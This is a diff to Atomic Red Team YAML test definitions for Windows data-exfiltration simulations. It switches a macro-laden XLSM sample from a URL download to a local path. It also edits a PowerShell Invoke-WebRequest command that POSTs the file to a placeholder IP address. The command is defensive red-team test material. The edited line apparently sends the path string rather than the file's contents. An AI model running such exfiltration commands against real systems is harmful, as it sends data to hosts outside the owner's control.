@@ -109,9 +109,9 @@ atomic_tests:
   - windows
   input_arguments:
     input_file: 
-      description: url to download XLSM file
-      type: url
-      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/src/T1027-cc-macro.xlsm
+      description: Path of the XLSM file
+      type: path
+      default: PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
     sender:
       description: sender email
       type: string
@@ -138,9 +138,9 @@ atomic_tests:
   - windows
   input_arguments:
     input_file: 
-      description: url to download XLSM file
-      type: url
-      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/src/T1027-cc-macro.xlsm
+      description: Path of the XLSM file
+      type: path
+      default: PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
     ip_address:
       description: Destination IP address
       type: string
@@ -148,6 +148,5 @@ atomic_tests:
   dependency_executor_name: powershell
   executor:
     command: |
-      $content = Get-Content #{input_file} 
-      Invoke-WebRequest -Uri #{ip_address} -Method POST -Body $content
+      Invoke-WebRequest -Uri #{ip_address} -Method POST -Body PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
     name: command_prompt
